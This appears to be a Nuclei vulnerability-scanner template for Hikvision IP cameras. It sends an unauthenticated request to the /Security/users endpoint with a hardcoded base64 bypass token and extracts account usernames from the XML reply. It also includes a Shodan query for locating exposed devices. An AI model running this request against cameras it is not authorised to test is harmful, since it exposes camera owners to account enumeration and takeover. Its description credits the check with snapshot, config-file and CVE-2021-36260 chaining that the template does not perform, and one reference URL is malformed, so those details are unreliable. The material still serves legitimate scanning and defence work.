http:
- extractors:
  - group: 1
    name: Usernames
    regex:
    - <userName>(.*?)</userName>
    type: regex
  matchers:
  - condition: and
    dsl:
    - contains_all(body, "userName","userLevel")
    - contains(content_type,"application/xml")
    - status_code == 200
    name: Usernames
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/Security/users?auth={{b64auth}}'
id: hikvision-cam-info-exposure
info:
  author: AbdulrahmanTamim
  description: 'Unauthenticated exposure of sensitive endpoints was detected on vulnerable
    Hikvision IP cameras. This included live snapshot feeds, encrypted configuration
    files, and full user credential XML through CVE-2021-36260 exploit chaining and
    bypass logic.

    '
  metadata:
    max-request: 1
    shodan-query: 3.1.3.150324
    verified: true
  name: Hikvision IP Camera - Info Exposure
  reference:
  - https://www.exploit-db.com/exploits/45231
  - https://www.cve.org/CVERecord?id=CVE-2021-36260
  - https://nvd.nist.nist.gov/vuln/detail/CVE-2021-36260
  - https://seclists.org/fulldisclosure/2017/Sep/23
  severity: high
  tags: hikvision,iot,camera,exposure,discovery
variables:
  b64auth: YWRtaW46MTEK
